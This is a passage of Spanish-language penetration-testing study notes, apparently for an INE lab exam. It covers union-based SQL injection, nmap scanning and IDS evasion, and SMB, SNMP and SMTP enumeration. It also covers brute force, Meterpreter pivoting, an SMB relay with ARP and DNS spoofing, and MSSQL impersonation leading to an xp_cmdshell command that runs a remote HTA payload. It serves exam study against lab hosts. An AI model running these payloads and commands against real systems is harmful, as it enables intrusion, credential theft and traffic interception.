a' or '1'='1' --
# Al ser TRUE, la query devuelve TODOS los registros de la tabla

# Paso 2: determinar el número de columnas con UNION SELECT
# Se va probando con distinta cantidad de columnas hasta que la
# query no dé error (deben coincidir con las columnas originales)
a' or '1'='1' union select 1 --
a' or '1'='1' union select 1,2,3 --
a' or '1'='1' union select 1,2,3,4,5 --
# La tabla tiene 5 columnas (esta última no da error)
# Nota: la columna 2 nunca se muestra en la respuesta -> no sirve
# para extraer datos, hay que usar otra columna visible

# Paso 3: obtener la versión del motor de base de datos (SQLite)
a' or '1'='1' union select sqlite_version(),2,3,4,5 --
# Resultado: SQLite version 3.22.0

# Paso 4: enumerar tablas del esquema (sqlite_master)
a' or '1'='1' union select tbl_name,2,3,4,5 from sqlite_master --
# Se identifican 2 tablas: results y secret_flag

# Obtener el SQL usado para crear las tablas (columna "sql" del schema):
a' or '1'='1' union select sql,2,3,4,5 from sqlite_master --
# Las últimas 2 entradas muestran el CREATE TABLE de results y
# secret_flag -> revela nombres de columnas de cada tabla

# Paso 5: extraer la flag secreta
a' or '1'='1' union select flag,2,value,4,5 from secret_flag --
# Se usa la columna 3 (no la 2, porque esa nunca se refleja en la
# respuesta como se vio en el paso 2) para mostrar el valor "value"
# de la tabla secret_flag

# Qué se puede lograr con Union-Based SQLi:
# - Extraer datos de CUALQUIER tabla de la base de datos (no solo la
#   que consulta la app), incluyendo tablas ocultas o de sistema
# - Enumerar el esquema completo (nombres de tablas, columnas, tipos)
#   sin acceso directo a la base de datos
# - Robar información sensible almacenada en otras tablas (credenciales,
#   flags, datos de otros usuarios, etc.) en una sola consulta combinada
```

## 04 - Network Penetration Testing

### ~ Host Discovery

#### Network Mapping

```bash
# Qué es
# Fase de "active information gathering" — viene después del passive info gathering
# Consiste en descubrir hosts, dispositivos y elementos de red dentro del scope,
# para entender la arquitectura y encontrar puntos de entrada

# Objetivos del Network Mapping
# 1. Discovery of Live Hosts
#    -> identificar qué IPs del rango están realmente activas
# 2. Identificación de puertos abiertos y servicios
#    -> qué puertos están abiertos y qué corre en ellos (define attack surface)
# 3. Network Topology Mapping
#    -> armar mapa/diagrama de routers, switches, firewalls, etc.
# 4. OS Fingerprinting
#    -> determinar el SO de cada host para adaptar el ataque
# 5. Service Version Detection
#    -> identificar versiones específicas de servicios
#    -> clave para buscar CVEs asociados a esa versión puntual
# 6. Identificación de filtros/seguridad
#    -> detectar firewalls, IPS y demás defensas de la red

# Puntos clave para el examen
# - Network Mapping = el "por qué" antes del "cómo" (Nmap, etc.)
# - Es el primer paso práctico dentro de active info gathering
# - Sin esto no sabés ni cuántos hosts tenés que atacar dentro del scope
```

#### Host Discovery Techniques

```bash
# Técnicas de Host Discovery

# 1. Ping Sweeps (ICMP Echo Requests)
#    -> enviar ICMP Echo Request a un rango de IPs
#    -> rápida y muy usada, pero fácil de detectar/bloquear

# 2. ARP Scanning
#    -> usa peticiones ARP para descubrir hosts
#    -> solo funciona dentro del mismo broadcast domain (misma LAN)

# 3. TCP SYN Ping (Half-Open Scan)
#    -> manda TCP SYN a un puerto específico (comúnmente 80)
#    -> si el host responde con SYN-ACK -> está vivo
#    -> más stealthy que ICMP ping

# 4. UDP Ping
#    -> manda paquetes UDP a un puerto específico
#    -> útil cuando el host no responde a ICMP ni TCP

# 5. TCP ACK Ping
#    -> manda TCP ACK a un puerto
#    -> no espera respuesta normal; si llega un RST -> el host está vivo

# 6. SYN-ACK Ping
#    -> manda paquetes TCP SYN-ACK
#    -> si llega un RST -> indica que el host está vivo

# Pros / Contras (las 2 más importantes para el examen)

# ICMP Ping
# + rápido y soportado en todos lados
# - muchos firewalls bloquean ICMP -> fácil de detectar/filtrar

# TCP SYN Ping
# + más stealthy que ICMP, puede evadir firewalls que permiten conexiones salientes
# - algunos hosts no responden a SYN, y el resultado puede verse afectado
#   por firewalls/IDS

# Puntos clave para el examen
# - No existe "la mejor técnica" -> depende de la red y del firewall/IDS presente
# - ICMP = rápido pero ruidoso / fácil de bloquear
# - TCP SYN = más sigiloso, buena alternativa cuando ICMP está filtrado
# - ARP scanning solo sirve en la misma red local (no rutea)
```
#### Host Discovery With Nmap

```bash
nmap -h # muestra todas las opciones disponibles
nmap -sn <target> #solo hace host discovery, no escanea puertos
nmap -Pn <target> # Salta el host discovery y asume que TODOS los hosts están vivos

nmap -sn 10.1.0.0/24 # Ping scan a toda la subnet
nmap -sn 10.1.0.0/24 --send-ip
# Fuerza el envío de paquetes IP en vez de frames ARP
# (por defecto, en la misma LAN, Nmap usa ARP en lugar de ICMP -> es más rápido)
# --send-ip obliga a usar ICMP/IP aunque estés en la misma red local

nmap -sn 10.4.23.227 10.4.23.228 # Ping scan a hosts específicos
nmap -sn 10.4.23.227-240 # Ping scan a un rango de IPs

nmap -sn -PS 10.4.23.227
# TCP SYN Ping — por defecto prueba contra el puerto 80
# usa un paquete SYN en vez de ICMP para el host discovery

nmap -sn -PS22 10.4.23.227 # TCP SYN Ping contra un puerto especifico
nmap -sn -PS1-1000 10.4.23.227 # TCP SYN Ping contra un rango de puertos (1 al 1000)
nmap -sn -PS80,3389,445 10.4.23.227 # TCP SYN Ping contra una lista específica de puertos

# -sn = no escanea puertos, solo confirma si el host está vivo

nmap -PS80,3389,445 10.4.23.227
# (sin -sn) TCP SYN Ping + además SÍ hace port scan sobre esos puertos
# combina host discovery y escaneo de puertos en un solo comando

nmap -sn -PA 10.4.23.227
# TCP ACK Ping — manda paquetes ACK en vez de SYN
# útil para bypassear firewalls stateless que solo filtran SYN entrantes

nmap -sn -PE 10.4.23.227 --send-ip
# Fuerza el uso de ICMP Echo Request (Type 8) explícitamente
# --send-ip asegura que se mande a nivel IP y no ARP

nmap -sn -v -T4 10.4.23.227
# -v = verbose (más output/detalle)
# -T4 = timing template "Aggressive" (más rápido, menos delay entre paquetes)
#       escala de -T0 (paranoid/lentísimo) a -T5 (insane/muy rápido y ruidoso)

# Puntos clave para el examen
# -sn = host discovery SIN port scan
# -Pn = SIN host discovery, asume todos vivos (bypass cuando ICMP está bloqueado)
# -PS = TCP SYN ping (default puerto 80, pero configurable)
# -PA = TCP ACK ping (bueno contra firewalls stateless)
# -PE = fuerza ICMP Echo explícito
# --send-ip = fuerza uso de IP/ICMP en vez de ARP en LAN
# -T0 a -T5 = velocidad del scan (0 lento/sigiloso -> 5 rápido/ruidoso)
```

### ~ Port Scanning

#### Port Scanning With Nmap

```bash
nmap <ip> # Scan default: host discovery + top 1000 puertos TCP

nmap -Pn <ip> # Salta host discovery, asume host vivo, escanea puertos igual

nmap -Pn -F <ip> # -F = Fast scan, solo top 100 puertos (en vez de los 1000 default)

nmap -Pn -p <port> <ip> # Escanea un puerto específico

nmap -Pn -p<port1,port2,etc..> <ip> # Escanea una lista específica de puertos

nmap -F 127.0.0.1 # Fast scan sobre localhost (loopback siempre responde, no necesita -Pn)

nmap -T4 -Pn -p- <ip>
# -p- = escanea TODOS los puertos (1-65535), no solo el top 1000
# -T4 = timing agresivo para que no tarde una eternidad

nmap -Pn -sS -F <ip>
# -sS = TCP SYN Scan ("half-open" scan)
# no completa el 3-way handshake -> más rápido y más sigiloso (stealth scan)
# requiere privilegios de root/admin

nmap -Pn -sT <ip>
# -sT = TCP Connect Scan
# completa el 3-way handshake completo (SYN -> SYN/ACK -> ACK)
# más lento y más "ruidoso"/detectable, pero no requiere privilegios root

nmap -sU <ip>
# -sU = UDP Scan
# escanea puertos UDP en vez de TCP (default sin -sU es TCP)
# mucho más lento que TCP porque UDP no tiene respuesta garantizada

nmap -Pn -sU <ip> # UDP scan saltando el host discovery

# Puntos clave para el examen
# -sS (SYN scan) = default cuando corrés como root, stealthy, no completa handshake
# -sT (Connect scan) = usa el handshake completo, se usa cuando no tenés privilegios
# -sU = escaneo UDP, mucho más lento y menos confiable que TCP
# -F = top 100 puertos | default = top 1000 | -p- = los 65535
```

#### Service Version & OS Detection

```bash
nmap -T4 -sS -sV -p- <ip>
# -sV = Service Version Detection
# intenta determinar la versión exacta del servicio corriendo en cada puerto abierto
# (ej: no solo "puerto 22 abierto" sino "OpenSSH 8.2p1")

nmap -T4 -sS -sV -O -p- <ip>
# -O = OS Detection
# intenta identificar el sistema operativo del host mediante fingerprinting
# (analiza respuestas TCP/IP stack para adivinar el SO)

nmap -T4 -sS -sV -O --osscan-guess -p- <ip>
# --osscan-guess = hace que Nmap "adivine" con más agresividad cuando
# no encuentra un match perfecto de OS fingerprint
# útil cuando el resultado normal de -O da porcentajes bajos de certeza

nmap -T4 -sS -sV --version-intensity 8 -O --osscan-guess -p- <ip>
# --version-intensity <0-9> = qué tan a fondo prueba para detectar la versión
# 0 = solo probes más comunes/livianos (más rápido, menos preciso)
# 9 = prueba TODOS los probes disponibles (más lento, más preciso)
# default = 7
# 8 = casi el máximo de intensidad, buena precisión sin llegar al extremo

# Puntos clave para el examen
# -sV = detecta versión del servicio (no solo el puerto/protocolo)
# -O = detecta el sistema operativo del host (fingerprinting TCP/IP stack)
# --osscan-guess = fuerza a Nmap a arriesgar un resultado aunque no esté 100% seguro
# --version-intensity = controla profundidad/precisión del -sV (0 rápido - 9 exhaustivo)
```

#### Nmap Scripting Engine (NSE)

```bash
ls -al /usr/share/nmap/scripts/ # lista todos los scripts NSE disponibles instalados en el sistema
ls -al /usr/share/nmap/scripts/ | grep -e 'http' # filtra solo los scripts relacionados a http (ej: http-title, http-headers, etc.)

nmap -sS -sV -sC -p- -T4 <ip>
# -sC = corre los scripts NSE "default" (categoría default)
# equivale a --script=default
# son los scripts más seguros/comunes (no intrusivos) que trae Nmap de fábrica

nmap --script-help=mongodb-databases
# muestra la ayuda/documentación de un script NSE específico
# útil para saber qué hace el script y qué argumentos acepta antes de correrlo

nmap -sS -sV -script=<script> -p<port> -T4 <ip>
# --script=<script> = corre un script NSE específico (no todos los default)
# se puede combinar con -p para apuntarlo directo al puerto/servicio relevante

nmap -sS -A -p- -T4 <ip>
# -A = Aggressive scan
# combina en un solo flag: -sV (version detection) + -O (OS detection)
#                          + -sC (scripts default) + traceroute
# muy completo pero MUY ruidoso -> fácil de detectar por IDS/IPS

# Puntos clave para el examen
# -sC = corre categoría "default" de scripts NSE (safe, no intrusivos)
# --script=<nombre> = corre un script puntual (ej: mongodb-databases, http-title)
# --script-help=<script> = muestra qué hace un script antes de usarlo
# -A = combo agresivo (sV + O + sC + traceroute) -> ideal en labs, riesgoso en real
# Los scripts NSE viven en /usr/share/nmap/scripts/
```

### ~ Firewall/IDS Evasion

```bash
nmap -Pn -sA -p445,3389 <ip>
# -sA = TCP ACK Scan
# no determina si el puerto está abierto/cerrado, sino si está FILTRADO o NO
# manda ACK: si responde RST -> "unfiltered" | si no responde -> "filtered"
# se usa para mapear reglas de firewall, no para descubrir puertos abiertos

nmap -Pn -sS -sV -F <ip> # SYN scan + version detection sobre el top 100 puertos (-F)

nmap -Pn -sS -sV -p80,445,3389 -f <ip>
# -f = fragmenta los paquetes (fragmentation)
# parte el paquete en fragmentos IP más pequeños
# -> puede evadir firewalls/IDS simples que no reensamblan fragmentos para inspeccionar

nmap -Pn -sS -sV -p80,445,3389 -f --mtu 32 <ip>
# --mtu <valor> = define el tamaño del MTU (debe ser múltiplo de 8)
# permite controlar el tamaño exacto de los fragmentos generados
# (más control que usar -f solo, que fragmenta con un tamaño fijo por defecto)

nmap -Pn -sS -sV -p80,445,3389 -f --data-length 200 -D <otra-ip o ips> <ip victima>
# --data-length <n> = agrega bytes random al final de los paquetes
# -> cambia la "firma"/tamaño del paquete para evadir firewalls basados en tamaño
# -D <decoy1,decoy2,...> = Decoy scan
# hace parecer que el scan viene de múltiples IPs (señuelos) además de la tuya
# -> dificulta identificar cuál IP es la real atacante en los logs del target

nmap -Pn -sS -sV -p80,445,3389 -f --data-length 200 -g 53 -D <otra-ip o ips> <ip victima>
# -g 53 (o --source-port 53) = fuerza el puerto de origen a 53 (DNS)
# muchos firewalls confían/permiten tráfico que "viene" del puerto 53
# -> técnica de evasión para que el tráfico parezca DNS legítimo

# Puntos clave para el examen
# -sA = detecta reglas de firewall (filtered/unfiltered), NO abre/cierra puertos
# -f / --mtu = fragmentación de paquetes para evadir inspección de firewalls/IDS
# --data-length = altera tamaño del paquete para evadir firmas basadas en tamaño
# -D = decoy scan, oculta tu IP real entre señuelos
# -g / --source-port = falsea el puerto de origen (ej: 53/DNS) para parecer tráfico confiable
```

### ~ Scan Timing & Performance

```bash
-T<0-5>
# Timing templates, controlan velocidad/agresividad del scan
# T0 = Paranoid  (el más lento, máximo sigilo, evade IDS)
# T1 = Sneaky
# T2 = Polite
# T3 = Normal    (default)
# T4 = Aggressive (rápido, recomendado en labs/CTFs)
# T5 = Insane    (el más rápido, muy ruidoso, puede perder resultados por timeouts)

--host-timeout
# define el tiempo máximo que Nmap espera por un host antes de darlo por perdido/saltarlo

nmap -sS -sV -F --host-timeout <Xs> <ip>
# X segundos = tiempo máximo de espera por host
# cuidado: si el tiempo es muy corto, Nmap puede descartar hosts que sí estaban
# vivos pero respondieron lento -> falsos negativos

nmap -sS -sV -F --scan-delay 5s <ip>
# --scan-delay = fuerza una pausa fija entre cada probe/paquete enviado
# más sigiloso, pero mucho más lento -> útil para evadir rate-limiting/IDS

nmap -sS -sV -F -T1 <ip>
# T1 (Sneaky) = scan muy lento y espaciado, pensado para evadir detección

nmap -sS -sV -F -T4 <ip>
# T4 (Aggressive) = scan rápido, ideal para entornos de lab/CTF donde
# el sigilo no es la prioridad

# Puntos clave para el examen
# -T0/T1 = sigilo (evasión), -T4/T5 = velocidad (a costa de ser detectado)
# --host-timeout = evita que Nmap se cuelgue esperando un host caído/lento
# --scan-delay = fuerza espaciado entre paquetes, útil contra IDS con rate-limiting
# Trade-off constante: a más velocidad -> más ruido/detección
#                       a más sigilo -> más tiempo de escaneo
```

### ~ Windows Enumeration

#### SMB & NetBIOS Enumeration

```bash

10.4.21.34 demo.ine.local # target directo
10.4.23.202 demo1.ine.local # target al que se llega vía pivoting

nmap demo.ine.local # scan inicial, top 1000 puertos

nmap -sV -p 139,445 demo.ine.local
# 139 = NetBIOS Session Service
# 445 = SMB directo sobre TCP (sin NetBIOS)
# -sV para ver versión del servicio SMB

nmap -p445 --script=smb-protocols.nse demo.ine.local
# enumera qué versiones del protocolo SMB soporta el host (SMBv1, v2, v3)

nmap -p445 --script=smb-security-mode demo.ine.local # verificamos el guest
# revisa el modo de seguridad SMB (user/share level) y si permite login "guest"

smbclient -L demo.ine.local
# lista los recursos compartidos (shares) del host
# presionamos enter -> acepta conexión anónima (sin password)

nmap -p445 --script=smb-shares.nse demo.ine.local
# enumera los shares SMB disponibles vía script NSE (alternativa a smbclient)

nmap -p445 --script smb-enum-users.nse demo.ine.local
# enumera usuarios del sistema vía SMB
# agregamos los usuarios encontrados a un users.txt

hydra -L users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt demo.ine.local smb
# -L = lista de usuarios | -P = lista de passwords
# fuerza bruta de credenciales SMB con Hydra

msfconsole -q
use exploit/windows/smb/psexec
set RHOSTS 10.4.21.34
set SMBUser administrator
set SMBPass password1
run
# psexec: usa credenciales válidas (admin) para ejecutar código remoto vía SMB
# obtenemos sesión de meterpreter

# Buscamos la primera flag desde meterpreter:
cat C:\\Users\\Administrator\\Documents\\FLAG1.txt

# --- Pivoting hacia demo1.ine.local (10.4.23.202) ---

shell
ping 10.4.23.202
# CTRL+C para salir de la shell nativa y volver a meterpreter

run autoroute -s 10.4.23.202/20
# autoroute = agrega una ruta a través de la sesión meterpreter
# para poder alcanzar la subnet 10.4.23.202/20 desde nuestra máquina

background
# manda la sesión meterpreter a segundo plano

use auxiliary/server/socks_proxy
set SRVPORT 9050
set VERSION 4a
exploit
# levanta un proxy SOCKS sobre la sesión meterpreter
# -> permite rutear herramientas externas (nmap, etc.) a través del pivot

# verificamos puerto y versión del proxy en /etc/proxychains4.conf (otra terminal)

proxychains nmap demo1.ine.local -sT -Pn -sV -p 445
# escaneo del segundo host usando proxychains + el socks_proxy
# -sT obligatorio (SYN scan -sS no funciona a través de proxychains)

# Volvemos a la sesión de meterpreter:
sessions -i 1
shell
net view 10.4.23.202
# System error 5 -> access denied / no se puede listar aún

# Migramos el proceso para tener más estabilidad/permisos:
# CTRL+C para salir de la shell
migrate -N explorer.exe

shell
net view 10.4.23.202             # ahora sí lista los recursos compartidos
net use D: \\10.4.23.202\Documents   # mapea el share Documents como unidad D:
net use K: \\10.4.23.202\K$          # mapea share administrativo K$

# CTRL+C para salir
cat D:\\Confidential.txt
cat D:\\FLAG2.txt

# Extra: herramientas útiles para enumeración SMB/NetBIOS
nbtscan 10.4.30.139   # escaneo NetBIOS de la red, muestra nombres/servicios
nmblookup -A 10.4.30.139  # consulta NetBIOS name table de un host específico

# Puntos clave para el examen
# 139 = NetBIOS Session Service | 445 = SMB directo (moderno, sin NetBIOS)
# smbclient -L y --script smb-shares.nse = dos formas de enumerar shares
# psexec = requiere credenciales válidas (admin) para RCE vía SMB
# autoroute + socks_proxy + proxychains = técnica clásica de pivoting con Meterpreter
# migrate -N explorer.exe = estabiliza la sesión moviéndola a un proceso más "seguro"
# net use = mapea shares SMB remotos como unidades locales (Windows)
```

#### SNMP Enumeration

```bash
nmap -sU -p 161 demo.ine.local
# escaneo UDP del puerto 161 (SNMP)
# SNMP corre sobre UDP, no TCP

nmap -sU -p 161 --script=snmp-brute demo.ine.local
# fuerza bruta contra el community string SNMP (default: usa wordlist propia de Nmap)
# SNMPv1/v2c se autentican con un "community string" en vez de user/password

snmpwalk -v 1 -c public demo.ine.local
# -v 1 = usa SNMP versión 1
# -c public = community string (público es el default más común/inseguro)
# "camina" todo el árbol MIB del host, volcando toda la info disponible vía SNMP
# (usuarios, procesos, software instalado, interfaces de red, etc.)

nmap -sU -p 161 --script snmp-* demo.ine.local > snmp_output
# corre TODOS los scripts NSE que empiecen con "snmp-" (wildcard)
# > snmp_output = guarda el resultado completo en un archivo

ls
# revisamos el archivo generado, y de ahí extraemos usuarios encontrados
# metemos los usuarios a un users.txt

hydra -L users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt demo.ine.local smb
# fuerza bruta de credenciales SMB usando los usuarios que sacamos por SNMP
# (SNMP filtró usuarios válidos del sistema -> ahora se prueban contra SMB)

msfconsole -q
use exploit/windows/smb/psexec
show options
set RHOSTS demo.ine.local
set SMBUSER administrator
set SMBPASS elizabeth
exploit
# psexec con las credenciales encontradas -> ejecución remota de código vía SMB

shell
cd C:\
dir
type FLAG1.txt
# shell nativa de Windows: dir = listar archivos | type = mostrar contenido de archivo

# Puntos clave para el examen
# SNMP corre sobre UDP/161, se autentica con "community string" (no user/pass)
# community strings default más comunes: "public" (read-only) y "private" (read-write)
# snmpwalk = vuelca toda la info MIB expuesta por el dispositivo (muy verboso)
# SNMP mal configurado suele filtrar usuarios válidos del sistema -> pivote para
# ataques de fuerza bruta en otros servicios (SMB, SSH, etc.)
# snmp-brute (NSE) = fuerza bruta de community strings
```

### ~ Linux Enumeration

```bash
nmap demo.ine.local demo2.ine.local demo3.ine.local demo4.ine.local
# escaneo inicial contra los 4 targets, para ver qué servicios corre cada uno

# === Target 1 (demo.ine.local) - SMTP, puerto 25 ===

nmap -sV -p 25 demo.ine.local
# identifica el servicio y versión -> Postfix smtpd

nmap --script smtp-commands -p 25 demo.ine.local
# lista los métodos/comandos SMTP habilitados en el server
# nos interesan 2 en particular:
# VRFY = valida si un usuario existe en el sistema
# ETRN = revela la dirección real de entrega de alias/mailing lists

# 3 formas de enumerar usuarios válidos vía SMTP (VRFY):

# 1) Metasploit
msfconsole -q
search smtp_enum
use auxiliary/scanner/smtp/smtp_enum
show options
set RHOSTS demo.ine.local
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
exploit
# resultado: 7 usuarios válidos (administrator, anon, auditor, demo, diag, rooty, sysadmin)

# 2) smtp-user-enum.pl (script Perl standalone)
smtp-user-enum -M VRFY -U /usr/share/metasploit-framework/data/wordlists/common_users.txt -t demo.ine.local
# -M VRFY = método de verificación | -U = wordlist de usuarios | -t = target
# mismo resultado: 7 usuarios

# 3) Script NSE de Nmap
nmap --script smtp-enum-users -p 25 demo.ine.local
# solo devuelve 3 usuarios (administrator, sysadmin, root)
# -> porque usa su propia wordlist interna, distinta a la de MSF:
# /usr/share/nmap/nselib/data/usernames.lst

# === Target 2 (demo2.ine.local) - Samba, puertos 445/139 ===

nmap -sV -p 445,139 demo2.ine.local
# identifica versión -> Samba smbd 3.X - 4.X

enum4linux -r demo2.ine.local | grep "Local User"
# -r = RID Cycling, enumera usuarios locales del host Samba
# encontramos 6 usuarios (sin contar "nobody")

smbmap -H demo2.ine.local
# lista shares SMB disponibles y sus permisos
# encontramos share "public" con permisos READ/WRITE

nmap --script smb-enum-shares -p 445 demo2.ine.local
# confirma qué shares permiten acceso anónimo/guest
# "public" es accesible anónimamente con READ/WRITE

smbclient -N \\\\demo2.ine.local\\public -U ""
# -N = sin password | -U "" = usuario en blanco (conexión anónima)
ls
cd secret\
ls
get flag
exit
cat flag
# FLAG (Samba): 03ddb97933e716f5057a18632badb3b4

rpcclient -U "" -N demo2.ine.local
# conexión anónima vía rpcclient, permite gestión/enumeración más profunda:
# enumdomusers    -> enumera usuarios
# enumdomgroups   -> enumera grupos del dominio
# enumdomains     -> info de dominios
# queryuser <RID> -> info detallada de un usuario puntual
# (con privilegios suficientes, incluso se pueden crear/borrar usuarios)

# === Target 3 (demo3.ine.local) - Finger, puerto 79 ===

finger root@demo3.ine.local
# consulta directa de info del usuario root (built-in en todo Linux)

msfconsole -q
search finger_users
use auxiliary/scanner/finger/finger_users
show options
set RHOSTS demo3.ine.local
exploit
# enumera usuarios válidos del sistema vía protocolo finger (TCP/79)

# Script standalone (finger-user-enum.pl) como alternativa a Metasploit:
cd /Desktop/tools
mkdir finger-user-enum
cd finger-user-enum
chmod +x finger-user-enum.pl
/root/Desktop/tools/finger-user-enum/finger-user-enum.pl -U /usr/share/metasploit-framework/data/wordlists/unix_users.txt -t demo3.ine.local
# -U = wordlist de usuarios a probar | -t = target
# encuentra usuarios + 3 flags escondidas en las cuentas: gopher, diag, webmaster

finger gopher@demo3.ine.local
finger diag@demo3.ine.local
finger webmaster@demo3.ine.local
# FLAG1: 098F6BCD4621D373CADE4E832627B4F6
# FLAG2: F765F7A0A169F4F6654EE72A84A9EB
# FLAG3: C4CA4238A0B923820DCC509A6F75849B

# El comando finger también expone data personal jugosa por usuario:
finger admin@demo3.ine.local   # teléfono de oficina
finger tom@demo3.ine.local     # a qué usuario se reenvía su email
finger tim@demo3.ine.local     # detalles de proyecto + fecha/hora de login
finger jim@demo3.ine.local     # si tiene PGP key
finger jil@demo3.ine.local     # su "plan" (plan file)

# === Target 4 (demo4.ine.local) - FTP, puerto 21 ===

nmap -sV -p 21 demo4.ine.local
# identifica versión -> ProFTPD 1.3.3c

nmap --script vuln -p 21 demo4.ine.local
# NSE category "vuln" -> corre todos los scripts de detección de vulnerabilidades
# detecta que ProFTPD 1.3.3c tiene un backdoor conocido
# y confirma explotabilidad porque el script logra ejecutar "id" en el target

# Puntos clave para el examen
# SMTP VRFY = enumera usuarios válidos; distintas wordlists dan distintos resultados
#             (MSF wordlist != Nmap NSE wordlist)
# enum4linux -r = RID Cycling para sacar usuarios locales de un host Samba
# smbmap = rápido para ver shares + permisos (READ/WRITE) de un vistazo
# rpcclient -U "" -N = sesión anónima con funciones de gestión de dominio Samba
# finger (TCP/79) = protocolo viejo pero MUY informativo (teléfono, proyecto, PGP,
#                    último login) si está mal configurado
# nmap --script vuln = forma rápida de chequear si un servicio tiene CVEs conocidos
#                       (ej: ProFTPD 1.3.3c backdoor)
```

### ~ Windows Exploitation

#### SMB Relay Attack

```bash
msfconsole
use exploit/windows/smb/smb_relay
set SRVHOST 172.16.5.101
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 172.16.5.101
set SMBHOST 172.16.5.10
exploit
# SRVHOST = IP donde el módulo levanta el server SMB falso (nuestra máquina)
# SMBHOST = target real al que se van a REENVIAR las credenciales capturadas
# LHOST   = IP para la conexión reversa del meterpreter
# el exploit queda escuchando conexiones SMB entrantes para capturar hashes

echo "172.16.5.101 *.sportsfoo.com" > dns
# creamos un archivo de DNS falso: TODOS los subdominios de sportsfoo.com
# van a resolver hacia nuestra IP atacante (wildcard *.sportsfoo.com)

dnsspoof -i eth1 -f dns
# -i = interfaz de red | -f = archivo con las entradas DNS falsas
# empieza a envenenar las respuestas DNS que pasen por esta interfaz

echo 1 > /proc/sys/net/ipv4/ip_forward
# habilita IP forwarding en el atacante
# necesario para actuar de "man in the middle" sin cortar la conexión de la víctima

# ARP Spoofing (2 terminales separadas) para interceptar el tráfico entre:
# víctima (Windows 7, 172.16.5.5)  <-->  gateway (172.16.5.1)
arpspoof -i eth1 -t 172.16.5.5 172.16.5.1   # nos hacemos pasar por el gateway ante la víctima
arpspoof -i eth1 -t 172.16.5.1 172.16.5.5   # nos hacemos pasar por la víctima ante el gateway
# (ARP poisoning detallado en el capítulo de Poisoning & Sniffing - Lab10)

# Flujo del ataque:
# 1. Windows 7 intenta conectarse a \\fileserver.sportsfoo.com\AnyShare
# 2. dnsspoof responde con la IP del atacante (172.16.5.101) en vez de la real
# 3. la víctima termina conectándose a \\172.16.5.101\AnyShare sin saberlo
# 4. el exploit smb_relay captura las credenciales/hash SMB de esa conexión
# 5. usa esas credenciales automáticamente contra el SMBHOST real (172.16.5.10)
#    -> obtenemos meterpreter en el target real
# (funciona porque la víctima usa las MISMAS credenciales en fileserver y target)

sessions
sessions -i 1
getuid
# listamos sesiones activas, interactuamos con la primera, y confirmamos
# con qué usuario quedamos ejecutando en la sesión meterpreter

# Puntos clave para el examen
# SMB Relay != password cracking: NO rompe el hash, lo REENVÍA (relay) en vivo
#   a otro host que confía en las mismas credenciales
# requiere: SMB signing deshabilitado en el target, y credenciales reutilizadas
#   entre el server que se está suplantando y el SMBHOST real
# combina 3 técnicas: DNS spoofing + ARP spoofing (MITM) + SMB relay (MSF)
# ip_forward=1 es indispensable para no cortar la conexión de la víctima al hacer MITM
```

#### MSSQL DB User Impersonation to RCE

```bash
nmap demo.ine.local
# scan inicial, puerto 1433 (MSSQL default) aparece abierto

nmap --script ms-sql-info -p 1433 demo.ine.local
# identifica versión del servidor -> Microsoft SQL Server 2019

python3 mssqlclient.py bob:KhyUuxwp7Mcxo7@demo.ine.local
# mssqlclient.py (impacket) para conectarse al MSSQL con credenciales de un
# usuario de bajo privilegio (bob)

select @@version;
# consulta versión del SQL Server + SO del host

select loginname from syslogins where sysadmin = 1;
# lista qué logins tienen el rol fijo "sysadmin" (control total sobre la instancia)
# por default, solo "sa" tiene este rol

enable_xp_cmdshell
# xp_cmdshell = stored procedure que permite ejecutar comandos del SO
#               directamente desde SQL (levanta una shell de Windows)
# con el usuario bob -> falla, no tiene privilegios para habilitarlo

SELECT distinct b.name FROM sys.server_permissions a
INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE'
# busca qué usuarios tienen permiso de IMPERSONATE sobre otros logins
# resultado: sa y dbuser permiten ser impersonados

SELECT SYSTEM_USER
EXECUTE AS LOGIN = 'sa'
# intento directo de impersonar a "sa" desde bob -> ERROR (sin permiso directo)

SELECT SYSTEM_USER
EXECUTE AS LOGIN = 'dbuser'
SELECT SYSTEM_USER
# impersonamos a dbuser -> funciona, ahora la sesión corre como dbuser

SELECT SYSTEM_USER
EXECUTE AS LOGIN = 'sa'
SELECT SYSTEM_USER
# desde dbuser, impersonamos a sa -> funciona
# cadena de escalación: bob -> dbuser -> sa
# (mala configuración: permisos de IMPERSONATE encadenados entre usuarios)

enable_xp_cmdshell
# ahora sí funciona, porque la sesión corre efectivamente como "sa" (sysadmin)

EXEC xp_cmdshell "whoami"
# RCE confirmado -> corre como NT Service\MSSQL$SQLEXPRESS

# --- Obtener meterpreter vía HTA Server ---

msfconsole -q
use exploit/windows/misc/hta_server
exploit
# hta_server = hostea un archivo .hta malicioso
# al abrirse, ejecuta un payload vía PowerShell (con prompts de IE de por medio)

EXEC xp_cmdshell "mshta.exe http://10.10.15.2:8080/Ju9EybU.hta"
# desde la sesión MSSQL (ya con sysadmin/xp_cmdshell), forzamos al target a
# ejecutar mshta.exe apuntando al HTA server -> dispara el payload

# (si no llega la sesión a la primera, repetir el comando)

sessions
sessions -i 1
sysinfo
getuid
# confirmamos la sesión meterpreter obtenida

cat C:\\flag.txt
# Flag: c5b7da8ca7d051749cd5d3e1e741ef91

# Puntos clave para el examen
# ms-sql-info (NSE) = identifica versión de MSSQL rápido sin necesidad de conectar
# sysadmin role = control total; por default solo lo tiene "sa"
# IMPERSONATE mal configurado = permite escalar de user en user hasta sysadmin
#   (cadena de impersonación: siempre revisar sys.server_permissions)
# xp_cmdshell = la vía clásica de RCE una vez con privilegios sysadmin en MSSQL
# hta_server (MSF) = técnica alternativa para obtener shell/meterpreter una vez
#   que ya tenés RCE vía xp_cmdshell (ejecuta mshta.exe contra el payload)
```

### ~ Linux Exploitation

```bash
nmap demo.ine.local
# scan inicial: puertos 80 (http) y 25 (smtp) abiertos

nmap -sV -p 80,25 demo.ine.local
# identifica versiones: Apache httpd 2.4.7 y Exim smtpd 4.89

# Firefox -> demo.ine.local
# la web corre la aplicación "EGallery" (versión desconocida)

searchsploit EGallery
# searchsploit = busca exploits públicos por nombre de servicio/app
# encuentra un módulo de Metasploit para EGallery

msfconsole -q
search egallery
use exploit/unix/webapp/egallery_upload_exec
show options
# módulo: EGallery Arbitrary '.PHP' File Upload
# por default trae TARGETURI=/sample, pero la app corre en la raíz -> hay que cambiarlo

ip addr
